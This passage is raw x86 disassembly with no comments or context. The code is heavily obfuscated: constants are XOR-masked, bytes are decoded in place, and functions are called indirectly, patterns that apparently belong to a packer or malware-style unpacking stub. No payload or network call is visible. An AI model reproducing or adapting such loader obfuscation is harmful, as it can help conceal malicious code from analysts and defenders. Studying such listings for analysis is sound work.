  412ab8:	mov    edx,DWORD PTR [eax+0x1b4]
  412abe:	call   0x414b33
  412ac3:	push   eax
  412ac4:	mov    eax,DWORD PTR [ebp+0x8]
  412ac7:	mov    eax,DWORD PTR [eax+0x1a8]
  412acd:	push   DWORD PTR [eax]
  412acf:	call   0x4147d5
  412ad4:	mov    ecx,DWORD PTR [ebp+0x8]
  412ad7:	mov    ecx,DWORD PTR [ecx+0x19c]
  412add:	mov    DWORD PTR [ecx],eax
  412adf:	mov    eax,DWORD PTR [ebp+0x8]
  412ae2:	mov    edi,DWORD PTR [eax+0x1d8]
  412ae8:	mov    esi,DWORD PTR [ebp+0x8]
  412aeb:	xor    eax,eax
  412aed:	lea    edx,[ebp-0x84]
  412af3:	call   0x414b69
  412af8:	push   eax
  412af9:	mov    eax,DWORD PTR [ebp+0x8]
  412afc:	mov    eax,DWORD PTR [eax+0x19c]
  412b02:	push   DWORD PTR [eax]
  412b04:	call   DWORD PTR [edi+0x8]
  412b07:	mov    DWORD PTR [ebp-0x18],eax
  412b0a:	mov    eax,DWORD PTR [ebp+0x8]
  412b0d:	mov    edi,DWORD PTR [eax+0x1d8]
  412b13:	mov    esi,DWORD PTR [ebp+0x8]
  412b16:	xor    eax,eax
  412b18:	lea    edx,[ebp-0x70]
  412b1b:	call   0x414b69
  412b20:	push   eax
  412b21:	mov    eax,DWORD PTR [ebp+0x8]
  412b24:	mov    eax,DWORD PTR [eax+0x19c]
  412b2a:	push   DWORD PTR [eax]
  412b2c:	call   DWORD PTR [edi+0x8]
  412b2f:	and    DWORD PTR [ebp-0x10],0x0
  412b33:	mov    eax,DWORD PTR [ebp-0x10]
  412b36:	and    eax,0x7
  412b39:	add    eax,0x31
  412b3c:	push   eax
  412b3d:	call   DWORD PTR [ebp-0x18]
  412b40:	test   eax,eax
  412b42:	jne    0x412b49
  412b44:	and    DWORD PTR [ebp-0xc],eax
  412b47:	jmp    0x412b71
  412b49:	mov    eax,DWORD PTR [ebp+0x8]
  412b4c:	mov    edi,DWORD PTR [eax+0x1d8]
  412b52:	mov    esi,DWORD PTR [ebp+0x8]
  412b55:	xor    eax,eax
  412b57:	lea    edx,[ebp-0x5c]
  412b5a:	call   0x414b69
  412b5f:	push   eax
  412b60:	mov    eax,DWORD PTR [ebp+0x8]
  412b63:	mov    eax,DWORD PTR [eax+0x198]
  412b69:	push   DWORD PTR [eax]
  412b6b:	call   DWORD PTR [edi+0x8]
  412b6e:	mov    DWORD PTR [ebp-0xc],eax
  412b71:	inc    DWORD PTR [ebp-0x10]
  412b74:	cmp    DWORD PTR [ebp-0x10],0x10
  412b78:	jb     0x412b33
  412b7a:	mov    eax,DWORD PTR [ebp-0x34]
  412b7d:	mov    esi,DWORD PTR [ebp+0x8]
  412b80:	xor    eax,ebx
  412b82:	mov    edi,0x3272dd
  412b87:	add    eax,edi
  412b89:	lea    edx,[ebp-0xcc]
  412b8f:	call   0x414b69
  412b94:	push   eax
  412b95:	mov    eax,DWORD PTR [ebp-0x8]
  412b98:	mov    esi,DWORD PTR [ebp+0x8]
  412b9b:	xor    eax,ebx
  412b9d:	add    eax,edi
  412b9f:	lea    edx,[ebp-0xec]
  412ba5:	call   0x414b69
  412baa:	push   eax
  412bab:	call   DWORD PTR [ebp-0xc]
  412bae:	mov    ecx,DWORD PTR [ebp-0x8]
  412bb1:	xor    ecx,ebx
  412bb3:	add    ecx,edi
  412bb5:	cmp    ecx,eax
  412bb7:	jne    0x412bc0
  412bb9:	mov    DWORD PTR [ebp-0x4],0x1
  412bc0:	mov    eax,DWORD PTR [ebp-0x34]
  412bc3:	mov    ecx,DWORD PTR [ebp-0x14]
  412bc6:	xor    eax,ebx
  412bc8:	lea    eax,[eax+ecx*1+0x3272dd]
  412bcf:	mov    DWORD PTR [ebp-0x14],eax
  412bd2:	mov    eax,DWORD PTR [ebp-0x4]
  412bd5:	test   eax,eax
  412bd7:	je     0x412beb
  412bd9:	mov    eax,DWORD PTR [ebp-0x34]
  412bdc:	mov    ecx,DWORD PTR [ebp-0x24]
  412bdf:	xor    eax,ebx
  412be1:	lea    eax,[eax+ecx*1+0x3272dd]
  412be8:	mov    DWORD PTR [ebp-0x24],eax
  412beb:	mov    eax,DWORD PTR [ebp-0x34]
  412bee:	xor    eax,ebx
  412bf0:	mov    ecx,0xffcd8d23
  412bf5:	sub    ecx,eax
  412bf7:	add    ecx,DWORD PTR [ebp-0x1c]
  412bfa:	mov    eax,DWORD PTR [ebp-0x14]
  412bfd:	cmp    eax,ecx
  412bff:	jbe    0x412aa8
  412c05:	mov    esi,edi
  412c07:	mov    eax,DWORD PTR [ebp-0x24]
  412c0a:	mov    ecx,DWORD PTR [ebp-0x14]
  412c0d:	cmp    ecx,eax
  412c0f:	jne    0x412c22
  412c11:	push   DWORD PTR [ebp+0x8]
  412c14:	lea    eax,[ebp-0x30]
  412c17:	push   eax
  412c18:	call   0x4155e2
  412c1d:	mov    DWORD PTR [ebp-0x20],eax
  412c20:	jmp    0x412c2e
  412c22:	mov    eax,DWORD PTR [ebp-0x20]
  412c25:	mov    ecx,DWORD PTR [ebp-0x34]
  412c28:	xor    ecx,ebx
  412c2a:	add    ecx,esi
  412c2c:	xor    DWORD PTR [eax],ecx
  412c2e:	mov    eax,DWORD PTR [ebp-0x8]
  412c31:	mov    ecx,DWORD PTR [ebp-0x20]
  412c34:	xor    eax,ebx
  412c36:	add    eax,esi
  412c38:	cmp    eax,ecx
  412c3a:	je     0x413224
  412c40:	mov    eax,DWORD PTR [ebp-0x8]
  412c43:	mov    ecx,DWORD PTR [ebp-0x30]
  412c46:	xor    eax,ebx
  412c48:	add    eax,esi
  412c4a:	cmp    eax,ecx
  412c4c:	je     0x413224
  412c52:	mov    eax,DWORD PTR [ebp-0x8]
  412c55:	xor    eax,ebx
  412c57:	add    eax,esi
  412c59:	jmp    0x412c77
  412c5b:	mov    edi,DWORD PTR [ebp-0x20]
  412c5e:	mov    cl,al
  412c60:	and    cl,0x1f
  412c63:	or     dl,0xff
  412c66:	sub    dl,cl
  412c68:	add    BYTE PTR [edi+eax*1],dl
  412c6b:	mov    ecx,DWORD PTR [ebp-0x34]
  412c6e:	xor    ecx,ebx
  412c70:	lea    eax,[eax+ecx*1+0x3272dd]
  412c77:	mov    ecx,DWORD PTR [ebp-0x30]
  412c7a:	cmp    eax,ecx
  412c7c:	jb     0x412c5b
  412c7e:	mov    eax,DWORD PTR [ebp-0x30]
  412c81:	mov    DWORD PTR [ebp-0x1c],eax
  412c84:	mov    eax,DWORD PTR [ebp-0x20]
  412c87:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  412c8e:	mov    DWORD PTR [ebp-0xa8],eax
  412c94:	mov    ecx,0xf89c85b2
  412c99:	mov    DWORD PTR [ebp-0x14],ecx
  412c9c:	mov    eax,DWORD PTR [ebp-0x24]
  412c9f:	xor    eax,ebx
  412ca1:	add    eax,esi
  412ca3:	mov    DWORD PTR [ebp-0x4],eax
  412ca6:	mov    eax,DWORD PTR [ebp-0x24]
  412ca9:	xor    eax,ebx
  412cab:	add    eax,esi
  412cad:	mov    DWORD PTR [ebp-0x10],eax
  412cb0:	mov    DWORD PTR [ebp-0x40],0xf89c85d5
  412cb7:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  412cbe:	mov    eax,DWORD PTR [ebp-0x24]
  412cc1:	mov    edx,DWORD PTR [ebp-0x1c]
  412cc4:	xor    eax,ebx
  412cc6:	add    eax,esi
  412cc8:	cmp    edx,eax
  412cca:	je     0x412e02
  412cd0:	jmp    0x412dde
  412cd5:	mov    edx,DWORD PTR [ebp-0x4]
  412cd8:	mov    eax,DWORD PTR [ebp-0x1c]
  412cdb:	mov    edi,DWORD PTR [ebp-0x40]
  412cde:	sub    eax,edx
  412ce0:	xor    edi,ebx
  412ce2:	xor    edx,edx
  412ce4:	add    edi,esi
  412ce6:	div    edi
  412ce8:	mov    DWORD PTR [ebp-0x10],eax
  412ceb:	mov    eax,DWORD PTR [ebp-0x44]
  412cee:	mov    edx,DWORD PTR [ebp-0x10]
  412cf1:	xor    eax,ebx
  412cf3:	add    eax,esi
  412cf5:	cmp    edx,eax
  412cf7:	jbe    0x412d03
  412cf9:	mov    eax,DWORD PTR [ebp-0x44]
  412cfc:	xor    eax,ebx
  412cfe:	add    eax,esi
  412d00:	mov    DWORD PTR [ebp-0x10],eax
  412d03:	mov    eax,DWORD PTR [ebp-0x40]
  412d06:	mov    edx,DWORD PTR [ebp-0x10]
  412d09:	xor    eax,ebx
  412d0b:	add    eax,esi
  412d0d:	imul   eax,edx
  412d10:	mov    DWORD PTR [ebp-0x10],eax
  412d13:	mov    eax,DWORD PTR [ebp-0x24]
  412d16:	mov    edx,DWORD PTR [ebp-0x10]
  412d19:	xor    eax,ebx
  412d1b:	add    eax,esi
  412d1d:	cmp    edx,eax
  412d1f:	je     0x412dcc
  412d25:	mov    eax,DWORD PTR [ebp-0x10]
  412d28:	mov    DWORD PTR [ebp-0xc],eax
  412d2b:	mov    eax,DWORD PTR [ebp-0x4]
  412d2e:	add    eax,DWORD PTR [ebp-0xa8]
  412d34:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  412d3b:	mov    DWORD PTR [ebp-0x38],ecx
  412d3e:	mov    DWORD PTR [ebp-0x28],0xf89c85b3
  412d45:	mov    DWORD PTR [ebp-0x88],eax
  412d4b:	mov    DWORD PTR [ebp-0x28],0xf89c85b0
  412d52:	mov    DWORD PTR [ebp-0x94],ecx
  412d58:	mov    eax,DWORD PTR [ebp-0x18]
  412d5b:	xor    eax,ebx
  412d5d:	add    eax,esi
  412d5f:	jmp    0x412d8f
  412d61:	mov    eax,DWORD PTR [ebp-0x94]
  412d67:	mov    edx,DWORD PTR [ebp-0x10]
  412d6a:	xor    eax,ebx
  412d6c:	add    eax,esi
  412d6e:	imul   eax,edx
  412d71:	mov    edx,DWORD PTR [ebp-0x88]
  412d77:	mov    BYTE PTR [eax+edx*1],0x0
  412d7b:	mov    eax,DWORD PTR [ebp-0x28]
  412d7e:	mov    edx,DWORD PTR [ebp-0x38]
  412d81:	xor    eax,ebx
  412d83:	xor    edx,ebx
  412d85:	add    eax,esi
  412d87:	add    edx,esi
  412d89:	imul   eax,edx
  412d8c:	add    eax,DWORD PTR [ebp-0x10]
  412d8f:	mov    DWORD PTR [ebp-0x10],eax
  412d92:	mov    eax,DWORD PTR [ebp-0x10]
  412d95:	mov    edx,DWORD PTR [ebp-0xc]
  412d98:	cmp    edx,eax
  412d9a:	jb     0x412d61
  412d9c:	mov    eax,DWORD PTR [ebp-0x38]
  412d9f:	mov    edx,DWORD PTR [ebp-0xc]
  412da2:	xor    eax,ebx
  412da4:	add    eax,esi
  412da6:	imul   eax,edx
  412da9:	mov    edx,DWORD PTR [ebp-0x18]
  412dac:	xor    edx,ebx
  412dae:	add    edx,esi
  412db0:	or     eax,edx
  412db2:	mov    edx,DWORD PTR [ebp-0x14]
  412db5:	xor    edx,ebx
  412db7:	add    eax,edx
  412db9:	mov    edx,DWORD PTR [ebp-0x14]
  412dbc:	xor    edx,ebx
  412dbe:	add    eax,edx
  412dc0:	mov    edx,DWORD PTR [ebp-0x4]
  412dc3:	lea    eax,[eax+edx*1+0x64e5ba]
  412dca:	jmp    0x412ddb
  412dcc:	mov    eax,DWORD PTR [ebp-0x14]
  412dcf:	mov    edx,DWORD PTR [ebp-0x4]
  412dd2:	xor    eax,ebx
  412dd4:	lea    eax,[eax+edx*1+0x3272dd]
  412ddb:	mov    DWORD PTR [ebp-0x4],eax
  412dde:	mov    eax,DWORD PTR [ebp-0x14]
  412de1:	xor    eax,ebx
  412de3:	mov    edx,0xffcd8d23
  412de8:	sub    edx,eax
  412dea:	add    edx,DWORD PTR [ebp-0x1c]
  412ded:	mov    eax,DWORD PTR [ebp-0x14]
  412df0:	mov    edi,DWORD PTR [ebp-0x4]
  412df3:	xor    eax,ebx
  412df5:	add    eax,esi
  412df7:	imul   eax,edi
  412dfa:	cmp    eax,edx
  412dfc:	jbe    0x412cd5
  412e02:	mov    eax,DWORD PTR [ebp-0x8]
  412e05:	mov    ecx,DWORD PTR [ebp-0x30]
  412e08:	mov    eax,DWORD PTR [ebp+0x8]
  412e0b:	mov    edx,DWORD PTR [ebp-0x3c]
  412e0e:	mov    eax,DWORD PTR [eax+0x1d8]
  412e14:	xor    edx,ebx
  412e16:	add    edx,esi
  412e18:	push   edx
  412e19:	mov    edx,DWORD PTR [ebp-0x2c]
  412e1c:	xor    edx,ebx
  412e1e:	add    edx,esi
  412e20:	push   edx
  412e21:	push   ecx
  412e22:	mov    DWORD PTR [ebp-0x28],ecx
  412e25:	mov    ecx,DWORD PTR [ebp-0x8]
  412e28:	xor    ecx,ebx
  412e2a:	add    ecx,esi
  412e2c:	push   ecx
  412e2d:	call   DWORD PTR [eax+0x14]
  412e30:	mov    edi,eax
  412e32:	mov    eax,DWORD PTR [ebp-0x8]
  412e35:	xor    eax,ebx
  412e37:	add    eax,esi
  412e39:	cmp    eax,edi
  412e3b:	je     0x412e96
  412e3d:	mov    eax,DWORD PTR [ebp-0x8]
  412e40:	jmp    0x412e63
  412e42:	mov    ecx,DWORD PTR [ebp-0x20]
  412e45:	xor    eax,ebx
  412e47:	mov    cl,BYTE PTR [ecx+eax*1+0x3272dd]
  412e4e:	mov    BYTE PTR [eax+edi*1+0x3272dd],cl
  412e55:	mov    ecx,DWORD PTR [ebp-0x34]
  412e58:	xor    ecx,ebx
  412e5a:	lea    eax,[ecx+eax*1+0x3272dd]
  412e61:	xor    eax,ebx
  412e63:	mov    ecx,DWORD PTR [ebp-0x30]
  412e66:	sub    ecx,esi
  412e68:	xor    ecx,ebx
  412e6a:	cmp    eax,ecx
  412e6c:	jne    0x412e42
  412e6e:	mov    eax,DWORD PTR [ebp+0x8]
  412e71:	mov    ecx,DWORD PTR [ebp-0x48]
  412e74:	mov    eax,DWORD PTR [eax+0x1d8]
  412e7a:	xor    ecx,ebx
  412e7c:	add    ecx,esi
  412e7e:	push   ecx
  412e7f:	mov    ecx,DWORD PTR [ebp-0x8]
  412e82:	xor    ecx,ebx
  412e84:	add    ecx,esi
  412e86:	push   ecx
  412e87:	push   DWORD PTR [ebp-0x20]
  412e8a:	call   DWORD PTR [eax+0x18]
  412e8d:	mov    eax,DWORD PTR [ebp-0x28]
  412e90:	mov    DWORD PTR [ebp-0x20],edi
  412e93:	mov    DWORD PTR [ebp-0x30],eax
  412e96:	mov    edi,DWORD PTR [ebp-0x20]
  412e99:	mov    eax,DWORD PTR [ebp-0x34]
  412e9c:	mov    ecx,DWORD PTR [ebp-0x8]
  412e9f:	xor    eax,ebx
  412ea1:	mov    DWORD PTR [ebp-0x28],edi
  412ea4:	add    eax,esi
  412ea6:	mov    DWORD PTR [ebp-0x50],0x3d122a12
  412ead:	mov    DWORD PTR [ebp-0x4c],0x27123f12
  412eb4:	jmp    0x412ee8
  412eb6:	xor    ecx,ebx
  412eb8:	mov    dl,BYTE PTR [ebp+ecx*1+0x32728d]
  412ebf:	xor    dl,0x71
  412ec2:	sub    dl,0xb
  412ec5:	mov    DWORD PTR [ebp-0x2c],ecx
  412ec8:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272dd]
  412ed0:	movzx  edx,dl
  412ed3:	cmp    ecx,edx
  412ed5:	jne    0x412ef2
  412ed7:	mov    ecx,DWORD PTR [ebp-0x34]
  412eda:	mov    edx,DWORD PTR [ebp-0x2c]
  412edd:	xor    ecx,ebx
  412edf:	lea    ecx,[ecx+edx*1+0x3272dd]
  412ee6:	xor    ecx,ebx
  412ee8:	cmp    ecx,0xf89c85bd
  412eee:	jne    0x412eb6
  412ef0:	jmp    0x412ef9
  412ef2:	mov    eax,DWORD PTR [ebp-0x8]
  412ef5:	xor    eax,ebx
  412ef7:	add    eax,esi
  412ef9:	mov    ecx,DWORD PTR [ebp-0x8]
  412efc:	xor    ecx,ebx
  412efe:	add    ecx,esi
  412f00:	cmp    ecx,eax
  412f02:	je     0x413075
  412f08:	mov    eax,DWORD PTR [edi+0x8]
  412f0b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  412f12:	mov    DWORD PTR [ebp-0x2c],0xf89cc304
  412f19:	mov    DWORD PTR [ebp-0x38],0xf89cb5b5
  412f20:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  412f27:	mov    DWORD PTR [ebp-0xc],eax
  412f2a:	mov    eax,DWORD PTR [ebp+0x8]
  412f2d:	mov    ecx,DWORD PTR [ebp-0x18]
  412f30:	xor    ecx,ebx
  412f32:	add    ecx,esi
  412f34:	push   ecx
  412f35:	mov    ecx,DWORD PTR [ebp-0x38]
  412f38:	mov    eax,DWORD PTR [eax+0x1d8]
  412f3e:	xor    ecx,ebx
  412f40:	add    ecx,esi
  412f42:	push   ecx
  412f43:	mov    ecx,DWORD PTR [ebp-0x2c]
  412f46:	xor    ecx,ebx
  412f48:	add    ecx,esi
  412f4a:	push   ecx
  412f4b:	mov    ecx,DWORD PTR [ebp-0x4]
  412f4e:	xor    ecx,ebx
  412f50:	add    ecx,esi
  412f52:	push   ecx
  412f53:	call   DWORD PTR [eax+0x14]
  412f56:	mov    edi,eax
  412f58:	mov    eax,DWORD PTR [ebp+0x8]
  412f5b:	mov    ecx,DWORD PTR [ebp-0x18]
  412f5e:	mov    eax,DWORD PTR [eax+0x1d8]
  412f64:	xor    ecx,ebx
  412f66:	add    ecx,esi
  412f68:	push   ecx
  412f69:	mov    ecx,DWORD PTR [ebp-0x38]
  412f6c:	xor    ecx,ebx
  412f6e:	add    ecx,esi
  412f70:	push   ecx
  412f71:	mov    ecx,DWORD PTR [ebp-0x4]
  412f74:	push   DWORD PTR [ebp-0xc]
  412f77:	xor    ecx,ebx
  412f79:	add    ecx,esi
  412f7b:	push   ecx
  412f7c:	call   DWORD PTR [eax+0x14]
  412f7f:	mov    ecx,DWORD PTR [ebp-0x4]
  412f82:	xor    ecx,ebx
  412f84:	add    ecx,esi
  412f86:	mov    DWORD PTR [ebp-0x18],eax
  412f89:	cmp    ecx,edi
  412f8b:	je     0x413251
  412f91:	mov    ecx,DWORD PTR [ebp-0x4]
  412f94:	xor    ecx,ebx
  412f96:	add    ecx,esi
  412f98:	cmp    ecx,eax
  412f9a:	je     0x413251
  412fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  412fa7:	mov    DWORD PTR [ebp-0x3c],0xf89c85b3
  412fae:	mov    ecx,DWORD PTR [ebp-0x2c]
  412fb1:	xor    cl,0x96
  412fb4:	sub    cl,0x23
  412fb7:	mov    BYTE PTR [edi],cl
  412fb9:	mov    ecx,DWORD PTR [ebp-0x4]
  412fbc:	xor    cl,0x96
  412fbf:	sub    cl,0x23
  412fc2:	mov    BYTE PTR [edi+0x1],cl
  412fc5:	mov    ecx,DWORD PTR [ebp-0x3c]
  412fc8:	xor    cl,0x96
  412fcb:	sub    cl,0x23
  412fce:	mov    BYTE PTR [edi+0x2],cl
  412fd1:	and    DWORD PTR [ebp-0x98],0x0
  412fd8:	and    DWORD PTR [ebp-0xa4],0x0
  412fdf:	lea    ecx,[ebp-0xa4]
  412fe5:	push   ecx
  412fe6:	push   DWORD PTR [ebp-0xc]
  412fe9:	push   eax
  412fea:	lea    eax,[ebp-0x98]
  412ff0:	push   eax
  412ff1:	mov    eax,DWORD PTR [ebp-0x28]
  412ff4:	push   DWORD PTR [eax+0xc]
  412ff7:	mov    eax,DWORD PTR [ebp-0x20]
  412ffa:	add    eax,0x10
  412ffd:	push   eax
  412ffe:	push   edi
  412fff:	call   0x41241b
  413004:	mov    DWORD PTR [ebp-0x2c],eax
  413007:	mov    eax,DWORD PTR [ebp+0x8]
  41300a:	mov    ecx,DWORD PTR [ebp-0x48]
  41300d:	mov    eax,DWORD PTR [eax+0x1d8]
  413013:	xor    ecx,ebx
  413015:	add    ecx,esi
  413017:	push   ecx
  413018:	mov    ecx,DWORD PTR [ebp-0x4]
  41301b:	xor    ecx,ebx
  41301d:	add    ecx,esi
  41301f:	push   ecx
  413020:	push   edi
  413021:	call   DWORD PTR [eax+0x18]
  413024:	mov    eax,DWORD PTR [ebp-0x2c]
  413027:	add    eax,0xffcd8d23
  41302c:	xor    eax,ebx
  41302e:	cmp    eax,0xf89c85b5
  413033:	mov    eax,DWORD PTR [ebp+0x8]
  413036:	mov    eax,DWORD PTR [eax+0x1d8]
  41303c:	mov    ecx,DWORD PTR [ebp-0x48]
  41303f:	jne    0x413062
  413041:	xor    ecx,ebx
  413043:	add    ecx,esi
  413045:	push   ecx
  413046:	mov    ecx,DWORD PTR [ebp-0x4]
  413049:	xor    ecx,ebx
  41304b:	add    ecx,esi
  41304d:	push   ecx
  41304e:	push   DWORD PTR [ebp-0x20]
  413051:	call   DWORD PTR [eax+0x18]
  413054:	mov    eax,DWORD PTR [ebp-0x18]
  413057:	mov    DWORD PTR [ebp-0x20],eax
  41305a:	mov    eax,DWORD PTR [ebp-0xc]
  41305d:	mov    DWORD PTR [ebp-0x30],eax
  413060:	jmp    0x413075
  413062:	xor    ecx,ebx
  413064:	add    ecx,esi
  413066:	push   ecx
  413067:	mov    ecx,DWORD PTR [ebp-0x4]
  41306a:	xor    ecx,ebx
  41306c:	add    ecx,esi
  41306e:	push   ecx
  41306f:	push   DWORD PTR [ebp-0x18]
  413072:	call   DWORD PTR [eax+0x18]
  413075:	mov    eax,DWORD PTR [ebp-0x30]
  413078:	mov    DWORD PTR [ebp-0x24],eax
  41307b:	mov    eax,DWORD PTR [ebp-0x20]
  41307e:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  413085:	mov    DWORD PTR [ebp-0x2c],eax
  413088:	mov    ecx,0xf89c85b2
  41308d:	mov    DWORD PTR [ebp-0x14],ecx
  413090:	mov    eax,DWORD PTR [ebp-0x1c]
  413093:	xor    eax,ebx
  413095:	add    eax,esi
  413097:	mov    DWORD PTR [ebp-0x4],eax
  41309a:	mov    eax,DWORD PTR [ebp-0x1c]
  41309d:	xor    eax,ebx
  41309f:	add    eax,esi
  4130a1:	mov    DWORD PTR [ebp-0xc],eax
  4130a4:	mov    DWORD PTR [ebp-0x38],0xf89c85d5
  4130ab:	mov    DWORD PTR [ebp-0x18],0xf89c85bc
  4130b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4130b5:	mov    edx,DWORD PTR [ebp-0x24]
  4130b8:	xor    eax,ebx
  4130ba:	add    eax,esi
  4130bc:	cmp    edx,eax
  4130be:	je     0x4131ed
  4130c4:	jmp    0x4131c9
  4130c9:	mov    edx,DWORD PTR [ebp-0x4]
  4130cc:	mov    eax,DWORD PTR [ebp-0x24]
  4130cf:	mov    edi,DWORD PTR [ebp-0x38]
  4130d2:	sub    eax,edx
  4130d4:	xor    edi,ebx
  4130d6:	xor    edx,edx
  4130d8:	add    edi,esi
  4130da:	div    edi
  4130dc:	mov    DWORD PTR [ebp-0xc],eax
  4130df:	mov    eax,DWORD PTR [ebp-0x18]
  4130e2:	mov    edx,DWORD PTR [ebp-0xc]
  4130e5:	xor    eax,ebx
  4130e7:	add    eax,esi
  4130e9:	cmp    edx,eax
  4130eb:	jbe    0x4130f7
  4130ed:	mov    eax,DWORD PTR [ebp-0x18]
  4130f0:	xor    eax,ebx
  4130f2:	add    eax,esi
  4130f4:	mov    DWORD PTR [ebp-0xc],eax
  4130f7:	mov    eax,DWORD PTR [ebp-0x38]
  4130fa:	mov    edx,DWORD PTR [ebp-0xc]
  4130fd:	xor    eax,ebx
  4130ff:	add    eax,esi
  413101:	imul   eax,edx
  413104:	mov    DWORD PTR [ebp-0xc],eax
  413107:	mov    eax,DWORD PTR [ebp-0x1c]
  41310a:	mov    edx,DWORD PTR [ebp-0xc]
  41310d:	xor    eax,ebx
  41310f:	add    eax,esi
  413111:	cmp    edx,eax
  413113:	je     0x4131b7
  413119:	mov    eax,DWORD PTR [ebp-0xc]
  41311c:	mov    DWORD PTR [ebp-0xc],eax
  41311f:	mov    eax,DWORD PTR [ebp-0x4]
  413122:	add    eax,DWORD PTR [ebp-0x2c]
  413125:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  41312c:	mov    DWORD PTR [ebp-0x40],ecx
  41312f:	mov    DWORD PTR [ebp-0x3c],0xf89c85b3
  413136:	mov    DWORD PTR [ebp-0x28],eax
  413139:	mov    DWORD PTR [ebp-0x88],0xf89c85b0
  413143:	mov    DWORD PTR [ebp-0x3c],ecx
  413146:	mov    eax,DWORD PTR [ebp-0x44]
  413149:	xor    eax,ebx
  41314b:	add    eax,esi
  41314d:	jmp    0x41317a
  41314f:	mov    eax,DWORD PTR [ebp-0x3c]
  413152:	mov    edx,DWORD PTR [ebp-0x10]
  413155:	xor    eax,ebx
  413157:	add    eax,esi
  413159:	imul   eax,edx
  41315c:	mov    edx,DWORD PTR [ebp-0x28]
  41315f:	mov    BYTE PTR [eax+edx*1],0x0
  413163:	mov    eax,DWORD PTR [ebp-0x88]
  413169:	mov    edx,DWORD PTR [ebp-0x40]
  41316c:	xor    eax,ebx
  41316e:	xor    edx,ebx
  413170:	add    eax,esi
  413172:	add    edx,esi
  413174:	imul   eax,edx
  413177:	add    eax,DWORD PTR [ebp-0x10]
  41317a:	mov    DWORD PTR [ebp-0x10],eax
  41317d:	mov    eax,DWORD PTR [ebp-0x10]
  413180:	mov    edx,DWORD PTR [ebp-0xc]
  413183:	cmp    edx,eax
  413185:	jb     0x41314f
  413187:	mov    eax,DWORD PTR [ebp-0x40]
  41318a:	mov    edx,DWORD PTR [ebp-0xc]
  41318d:	xor    eax,ebx
  41318f:	add    eax,esi
  413191:	imul   eax,edx
  413194:	mov    edx,DWORD PTR [ebp-0x44]
  413197:	xor    edx,ebx
  413199:	add    edx,esi
  41319b:	or     eax,edx
  41319d:	mov    edx,DWORD PTR [ebp-0x14]
  4131a0:	xor    edx,ebx
  4131a2:	add    eax,edx
  4131a4:	mov    edx,DWORD PTR [ebp-0x14]
  4131a7:	xor    edx,ebx
  4131a9:	add    eax,edx
  4131ab:	mov    edx,DWORD PTR [ebp-0x4]
  4131ae:	lea    eax,[eax+edx*1+0x64e5ba]
  4131b5:	jmp    0x4131c6
  4131b7:	mov    eax,DWORD PTR [ebp-0x14]
  4131ba:	mov    edx,DWORD PTR [ebp-0x4]
  4131bd:	xor    eax,ebx
  4131bf:	lea    eax,[eax+edx*1+0x3272dd]
  4131c6:	mov    DWORD PTR [ebp-0x4],eax
  4131c9:	mov    eax,DWORD PTR [ebp-0x14]
  4131cc:	xor    eax,ebx
  4131ce:	mov    edx,0xffcd8d23
  4131d3:	sub    edx,eax
  4131d5:	add    edx,DWORD PTR [ebp-0x24]
  4131d8:	mov    eax,DWORD PTR [ebp-0x14]
  4131db:	mov    edi,DWORD PTR [ebp-0x4]
  4131de:	xor    eax,ebx
  4131e0:	add    eax,esi
  4131e2:	imul   eax,edi
  4131e5:	cmp    eax,edx
  4131e7:	jbe    0x4130c9
  4131ed:	push   DWORD PTR [ebp+0x8]
  4131f0:	mov    eax,DWORD PTR [ebp+0x8]
  4131f3:	push   DWORD PTR [eax+0x1cc]
  4131f9:	lea    eax,[ebp-0xa0]
  4131ff:	push   eax
  413200:	mov    eax,DWORD PTR [ebp+0x8]
  413203:	mov    eax,DWORD PTR [eax+0x1c4]
  413209:	push   DWORD PTR [eax]
  41320b:	mov    eax,DWORD PTR [ebp+0x8]
  41320e:	mov    eax,DWORD PTR [eax+0x1c0]
  413214:	push   DWORD PTR [eax]
  413216:	push   DWORD PTR [ebp-0x30]
  413219:	push   DWORD PTR [ebp-0x20]
  41321c:	call   0x413cf2
  413221:	mov    DWORD PTR [ebp-0x2c],eax
  413224:	mov    eax,DWORD PTR [ebp-0x8]
  413227:	mov    ecx,DWORD PTR [ebp-0x20]
  41322a:	xor    eax,ebx
  41322c:	add    eax,esi
  41322e:	cmp    eax,ecx
  413230:	je     0x413251
  413232:	mov    eax,DWORD PTR [ebp+0x8]
  413235:	mov    ecx,DWORD PTR [ebp-0x48]
  413238:	mov    eax,DWORD PTR [eax+0x1d8]
  41323e:	xor    ecx,ebx
  413240:	add    ecx,esi
  413242:	push   ecx
  413243:	mov    ecx,DWORD PTR [ebp-0x8]
  413246:	xor    ecx,ebx
  413248:	add    ecx,esi
  41324a:	push   ecx
  41324b:	push   DWORD PTR [ebp-0x20]
  41324e:	call   DWORD PTR [eax+0x18]
  413251:	pop    edi
  413252:	pop    esi
  413253:	pop    ebx
  413254:	leave  
  413255:	ret    0x4
  413258:	push   ebp
  413259:	mov    ebp,esp
  41325b:	push   ecx
  41325c:	push   ecx
  41325d:	lea    eax,[ebp-0x8]
  413260:	mov    DWORD PTR [ebp-0x4],eax
  413263:	push   esi
  413264:	mov    esi,DWORD PTR [ebp-0x4]
  413267:	mov    eax,0xf881ba0f
  41326c:	mov    DWORD PTR [esi],eax
  41326e:	mov    esi,DWORD PTR [ebp-0x8]
  413271:	cmp    esi,eax
  413273:	pop    esi
  413274:	jne    0x41327e
  413276:	mov    BYTE PTR [ecx+0xa],0x7a
  41327a:	mov    BYTE PTR [edx+0x8],0x2f
  41327e:	mov    BYTE PTR [edx+0xa],0x7a
  413282:	mov    BYTE PTR [ecx+0x2],0x8
  413286:	leave  
  413287:	ret    
  413288:	push   ebp
  413289:	mov    ebp,esp
  41328b:	push   ecx
  41328c:	push   ecx
  41328d:	lea    eax,[ebp-0x8]
  413290:	mov    DWORD PTR [ebp-0x4],eax
  413293:	mov    edx,DWORD PTR [ebp-0x4]
  413296:	mov    eax,0xf88b0beb
  41329b:	mov    DWORD PTR [edx],eax
  41329d:	mov    edx,DWORD PTR [ebp-0x8]
  4132a0:	cmp    edx,eax
  4132a2:	jne    0x4132b3
